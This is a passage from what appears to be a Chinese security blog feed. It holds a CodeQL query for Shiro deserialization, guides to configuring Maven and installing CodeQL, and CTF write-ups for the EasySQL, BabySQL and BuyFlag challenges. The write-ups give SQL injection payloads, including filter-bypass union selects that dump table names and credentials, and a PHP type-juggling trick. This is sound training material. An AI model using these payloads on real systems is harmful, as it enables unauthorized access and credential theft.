class="hljs-constructor">Type()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>=&quot;byte&quot; <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    exp<span class="hljs-constructor">Dest</span>=call <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    call.get<span class="hljs-constructor">Argument(0)</span>=exp<span class="hljs-constructor">Src</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    call.get<span class="hljs-constructor">Method()</span> = <span class="hljs-keyword">method</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    <span class="hljs-keyword">method</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;decrypt&quot;</span>)</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">    <span class="hljs-keyword">method</span>.get<span class="hljs-constructor">DeclaringType()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span> = &quot;<span class="hljs-constructor">CipherService</span>&quot;</span><br><span class="hljs-pattern-match">    )</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match"><span class="hljs-keyword">class</span> <span class="hljs-constructor">VulConfig</span> extends <span class="hljs-constructor">TaintTracking</span>::<span class="hljs-constructor">Configuration</span>&#123;</span><br><span class="hljs-pattern-match">    <span class="hljs-constructor">VulConfig()</span>&#123;this = &quot;shiro<span class="hljs-constructor">Config</span>&quot;&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">    override predicate is<span class="hljs-constructor">Source(DataFlow::Node <span class="hljs-params">source</span>)</span> &#123;</span><br><span class="hljs-pattern-match">        exists(<span class="hljs-constructor">MethodAccess</span> ma | </span><br><span class="hljs-pattern-match">            ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">Name()</span> = &quot;get<span class="hljs-constructor">Cookies</span>&quot; </span><br><span class="hljs-pattern-match">            <span class="hljs-keyword">and</span> source.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span> = ma</span><br><span class="hljs-pattern-match">            )</span><br><span class="hljs-pattern-match">    &#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">    override predicate is<span class="hljs-constructor">Sink(DataFlow::Node <span class="hljs-params">sink</span>)</span> &#123;</span><br><span class="hljs-pattern-match">        exists(<span class="hljs-constructor">MethodAccess</span> call |</span><br><span class="hljs-pattern-match">        call.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">Name()</span>=&quot;read<span class="hljs-constructor">Object</span>&quot; <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">        sink.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span>=call</span><br><span class="hljs-pattern-match">        )</span><br><span class="hljs-pattern-match">    &#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">    override predicate is<span class="hljs-constructor">AdditionalTaintStep(DataFlow::Node <span class="hljs-params">node1</span>, DataFlow::Node <span class="hljs-params">node2</span>)</span> &#123;</span><br><span class="hljs-pattern-match">        is<span class="hljs-constructor">CookiegetValue(<span class="hljs-params">node1</span>.<span class="hljs-params">asExpr</span>()</span>, node2.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span>) <span class="hljs-keyword">or</span></span><br><span class="hljs-pattern-match">        is<span class="hljs-constructor">ReadObject(<span class="hljs-params">node1</span>.<span class="hljs-params">asExpr</span>()</span>, node2.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span>) <span class="hljs-keyword">or</span></span><br><span class="hljs-pattern-match">        is<span class="hljs-constructor">Base64(<span class="hljs-params">node1</span>.<span class="hljs-params">asExpr</span>()</span>, node2.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span>) <span class="hljs-keyword">or</span></span><br><span class="hljs-pattern-match">        isdecrypt(node1.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span>, node2.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span>)</span><br><span class="hljs-pattern-match">    &#125;</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">from <span class="hljs-constructor">VulConfig</span> config, <span class="hljs-constructor">DataFlow</span>::<span class="hljs-constructor">PathNode</span> source, <span class="hljs-constructor">DataFlow</span>::<span class="hljs-constructor">PathNode</span> sink</span><br><span class="hljs-pattern-match">where config.has<span class="hljs-constructor">FlowPath(<span class="hljs-params">source</span>, <span class="hljs-params">sink</span>)</span></span><br><span class="hljs-pattern-match">select sink.get<span class="hljs-constructor">Node()</span>, source, sink, &quot;source are&quot;</span><br></code></pre></td></tr></table></figure><p>解释一些这段代码，首先source和sink的设置就是上面所述的，主要是四段断链重连的谓语（predicate），</p><ul><li>将<code>Cookie</code>类型与<code>Cookie.getValue()</code>连接，这是为了连接，<br><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226214437763.png" alt="image-20221226214437763"></li><li>将<code>ObjectInputStream</code>与<code>ObjectInputStream.readObject()</code>连接，<br><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226214544381.png" alt="image-20221226214544381"></li><li>将<code>String</code>与<code>Base64.decode</code>连接（这个没神用），</li><li>将<code>byte</code>与<code>CipherService.decrypt</code>连接（这个没什么用），</li></ul><p>最后的发现了7个结果，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226215454041.png" alt="image-20221226215454041"></p><p>我觉得主要的误报是在重连这里。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html">java反序列化工具ysoserial分析 - angelwhu (wooyun.js.org)</a></p><p><a href="https://johnfrod.top/%E5%B7%A5%E5%85%B7/ysoserial-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B/">ysoserial 安装使用调试教程 – JohnFrod’s Blog</a></p><p><a href="https://www.cnblogs.com/panisme/p/12552838.html">Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）复现 - Panisme - 博客园 (cnblogs.com)</a></p><p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞 (seebug.org)</a></p><p><a href="https://www.anquanke.com/post/id/255721#h3-10">CodeQL从0到1（内附Shiro检测demo）-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">Apache Shiro Java 反序列化漏洞分析 - 知道创宇 (knownsec.com)</a></p><p><a href="https://blog.csdn.net/qq_44769520/article/details/123476443">IDEA搭建shiro550复现环境_zyer1的博客-CSDN博客_idea shiro</a></p><p><a href="https://www.anquanke.com/post/id/225442#h2-7">Java安全之Shiro 550反序列化漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13894507.html">Java安全之安全加密算法 - nice_0e3 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>codeql</tag>
      
      <tag>shiro</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 极客大挑战2019-EasySQL</title>
    <link href="/2022/11/19/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/"/>
    <url>/2022/11/19/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>这是一个登录界面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119224735499.png" alt="image-20221119224735499"></p><p>尝试使用万能密码登录，</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">账号：<br>&#x27; or &#x27;<br>密码：<br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119224845645.png" alt="image-20221119224845645"></p><p>然后提示账号或密码错误，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119224903179.png" alt="image-20221119224903179"></p><p>然后</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">账号：<br><span class="hljs-comment">&#x27;</span><br>密码：<br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>登录后提示了错误，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119225130529.png" alt="image-20221119225130529"></p><p>看到这个错误，接着尝试使用注释，</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">账号：<br>&#x27; or &#x27;&#x27;#<br>&#x27; or &#x27;#<br>密码：<br>123<br></code></pre></td></tr></table></figure><p>这两个测试都没有通过，显示需要账号密码都需要输入。</p><p>这样就要考虑使用</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">账号：<br><span class="hljs-comment">&#x27;</span><br>密码：<br><span class="hljs-comment">&#x27;</span><br></code></pre></td></tr></table></figure><p>这样显示账号或密码错误，说明这样也是可以闭合的，接着使用，</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">账号：<br>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span><br>密码：<br>&#x27;<br></code></pre></td></tr></table></figure><p>然后提示列数错误，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119230521421.png" alt="image-20221119230521421"></p><p>依次测试列数，最后使用，</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">账号：<br>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>密码：<br>&#x27;<br></code></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119230618575.png" alt="image-20221119230618575"></p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] maven配置</title>
    <link href="/2022/11/19/%5Bjava%5D%20maven-%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/11/19/%5Bjava%5D%20maven-%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h1><p>maven主要用来管理项目依赖问题，这里主要记录maven的配置。</p><p>maven的配置文件是<code>conf/settings.xml</code>，主要修改了三个内容：</p><ul><li>本地仓库路径</li><li>国内镜像源</li><li>默认JDK版本</li></ul><p>除了配置这几项之外，如果要添加环境变量，将<code>bin</code>目录添加即可。</p><p>在IDEA中，如果不配置maven会有默认的配置，也是可以用的。</p><h2 id="本地仓库路径"><a href="#本地仓库路径" class="headerlink" title="本地仓库路径"></a>本地仓库路径</h2><p>使用标签为<code>localRepository</code>，默认是注释的，添加或者修改，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>[仓库路径]<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="国内镜像源"><a href="#国内镜像源" class="headerlink" title="国内镜像源"></a>国内镜像源</h2><p>使用国内源可以加快依赖下载速度，在<code>&lt;mirrors&gt;</code>标签下添加相应内容，这里主要是阿里仓库，使用中央仓库可能会下载失败，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 阿里云仓库 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>alimaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>aliyun maven<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/repositories/central/<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 中央仓库1 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>repo1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://repo1.maven.org/maven2/<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 中央仓库2 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>repo2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://repo2.maven.org/maven2/<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="默认JDK版本"><a href="#默认JDK版本" class="headerlink" title="默认JDK版本"></a>默认JDK版本</h2><p>在<code>&lt;profiles&gt;</code>标签下添加<code>&lt;profile&gt;</code>标签，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">profile</span>&gt;</span>     <br>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>JDK-1.8<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>       <br>    <span class="hljs-tag">&lt;<span class="hljs-name">activation</span>&gt;</span>       <br>        <span class="hljs-tag">&lt;<span class="hljs-name">activeByDefault</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">activeByDefault</span>&gt;</span>       <br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">jdk</span>&gt;</span>       <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">activation</span>&gt;</span>       <br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>       <br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>       <br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>       <br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span>       <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>       <br><span class="hljs-tag">&lt;/<span class="hljs-name">profile</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>maven</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[代码审计] codeql安装</title>
    <link href="/2022/11/19/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E5%AE%89%E8%A3%85/"/>
    <url>/2022/11/19/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="codeql安装"><a href="#codeql安装" class="headerlink" title="codeql安装"></a>codeql安装</h1><p>codeql是静态代码分析工具，支持多种语言（如：Java、Go、C&#x2F;C++、Python等）。codeql使用的QL语言，类似与SQL的语法，当然codeql在进行审计之前需要生成数据库，所以其实两者之间关系密切。</p><p>CodeQL通常的应用场景是对漏洞进行举一反三（变种分析Variant Analysis），即对1Day进行分析复现，产出的QL检测脚本可以用来查询同应用是否有一样的问题，或者其他类似产品是否有一样问题，极大降低了人工审计成本，并且沉淀安全人员知识，越用越轻松。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/1628393764_610f5124871284791d535.png" alt="img"></p><p>这篇文章主要介绍codeql的安装，以及其在vscode的配置，需要用到：</p><ul><li>codeql引擎</li><li>codeql工具包</li><li>vscode</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装codeql引擎"><a href="#安装codeql引擎" class="headerlink" title="安装codeql引擎"></a>安装codeql引擎</h3><p>在<a href="https://github.com/github/codeql-cli-binaries/releases">这里</a>下载最新版本的对应系统的引擎，然后解压到合适位置即可。</p><p>然后把codeql的安装目录添加到环境变量中；</p><h3 id="下载语言工具包"><a href="#下载语言工具包" class="headerlink" title="下载语言工具包"></a>下载语言工具包</h3><p>在<a href="https://github.com/github/codeql-cli-binaries/releases">这里</a>下载语言工具包，或者可以用<code>git clone</code>来下载。</p><h3 id="vscode配置"><a href="#vscode配置" class="headerlink" title="vscode配置"></a>vscode配置</h3><p>在vscode搜索codeql插件，然后安装，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119215239526.png" alt="image-20221119215239526"></p><p>安装好之后在插件设置中配置codeql，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119215318982.png" alt="image-20221119215318982"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119215349106.png" alt="image-20221119215349106"></p><p>成功之后在vscode左边功能栏会出现codeql，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119215504680.png" alt="image-20221119215504680"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试一个java项目，需要用到maven，关于maven的配置这里不介绍了。</p><p>创建一个java项目，随便写点代码。</p><p>要使用codeql进行审计，首先需要生成数据库，使用命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs codeql">codeql database create [数据库生成位置] --language=java --command=&quot;mvn clean install --file pom.xml&quot; --source-root=[项目根目录路径]<br></code></pre></td></tr></table></figure><p>这里使用的java语言，所以需要编译，编译使用的是maven，所以<code>command</code>这里是使用maven对项目进行编译的命令；<code>source-root</code>是项目路径，如果直接在项目中执行命令，这个也可以忽略，</p><p>执行命令后等一会就会生成数据库了，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119220244551.png" alt="image-20221119220244551"></p><p>接着打开vscode，选择QL功能，选择从目录中打开数据库，然后打开生成的数据库，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119220439728.png" alt="image-20221119220439728"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119220522255.png" alt="image-20221119220522255"></p><p>打开下载的语言工具包，并在<code>java/ql/examples</code>目录创建文件<code>testql.ql</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119220634441.png" alt="image-20221119220634441"></p><p><code>codeql.ql</code>文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs codeql">import java<br><br>select &quot;hello codeql&quot;<br></code></pre></td></tr></table></figure><p>接着在该文件上右键，选择<code>Run Queries in Selected Files</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119220742063.png" alt="image-20221119220742063"></p><p>等一会就会执行成功，在右边栏显示结果，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221119220837992.png" alt="image-20221119220837992"></p><p>执行成功，接下来就可以开始CodeQL审计了。（当然不是，首先要学会QL语法，感觉这个还听复杂的。。）</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>codeql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 极客大挑战2019-BabySQL</title>
    <link href="/2022/11/14/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/"/>
    <url>/2022/11/14/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>这是一个登录界面：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114224452543.png" alt="image-20221114224452543"></p><p>首先尝试登录，使用万能密码：</p><ul><li>用户名：<code>admin&#39;</code>，密码：<code>123</code>，出错了</li><li>用户名：<code>admin&#39; or &#39;1&#39;=&#39;1</code>，密码：<code>123</code>，提示用户名或密码错误</li></ul><p>那么用户名就可能存在SQL注入。</p><p>使用<code>admin&#39; order by 1#</code>，有这样的错误：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114224857816.png" alt="image-20221114224857816"></p><p>显然是因为<code>or</code>被过滤了；然后使用<code>admin&#39; union select null#</code>，出现：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114224958080.png" alt="image-20221114224958080"></p><p>是因为<code>union</code>和<code>select</code>被过滤了？尝试用双写绕过，使用<code>admin&#39; uniounionn selecselectt null#</code>，出现：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114225114649.png" alt="image-20221114225114649"></p><p>说明方法对了，最后知道了有3列，<code>admin&#39; uniounionn selecselectt null,1,2#</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114225253881.png" alt="image-20221114225253881"></p><p>尝试爆表，经过尝试最后使用的是：<code>&#39;+uniounionn+selecselectt+null,1,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whewherere+table_schema=database()#</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114225728623.png" alt="image-20221114225728623"></p><p>尝试爆列，<code>&#39;+uniounionn+selecselectt+null,1,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whewherere+table_schema=database()+anandd+table_name=&#39;b4bsql&#39;#</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114230031384.png" alt="image-20221114230031384"></p><p>获取数据，<code>&#39;+uniounionn+selecselectt+null%2C1%2Cgroup_concat(username,passwoorrd)+frfromom+b4bsql%23</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114230519688.png" alt="image-20221114230519688"></p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 极客大挑战2019-BuyFlag</title>
    <link href="/2022/11/14/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/"/>
    <url>/2022/11/14/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>进入题目后是一个介绍页面，有一个子页面：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221237132.png" alt="image-20221114221237132"></p><p>要得到FLAG需要100000000，还有两个提示必须是来自CUIT的学生，必须回答正确密码；</p><p>查看源代码，有这样一段：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">~~~post money and password~~~</span><br><span class="hljs-comment">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="hljs-comment">$password = $_POST[&#x27;password&#x27;];</span><br><span class="hljs-comment">if (is_numeric($password)) &#123;</span><br><span class="hljs-comment">echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="hljs-comment">&#125;elseif ($password == 404) &#123;</span><br><span class="hljs-comment">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><p>发送POST请求，参数为<code>password</code>，如果参数是不是数字，且等于<code>404</code>就是正确密码；由于PHP的<code>==</code>是弱类型比较，所以类似<code>404;==404</code>返回的是<code>true</code>，而且<code>404;</code>不是数字。</p><p>抓包发送请求，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221703187.png" alt="image-20221114221703187"></p><p>提示身份不对不能购买；看到<code>Cookie</code>中有<code>user</code>，所以修改参数为<code>1</code>，重新发送请求，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221831698.png" alt="image-20221114221831698"></p><p>提示密码正确，需要money，那么添加一个参数<code>money</code>，但是又提示参数太长了，使用科学计数法：</p><p><img 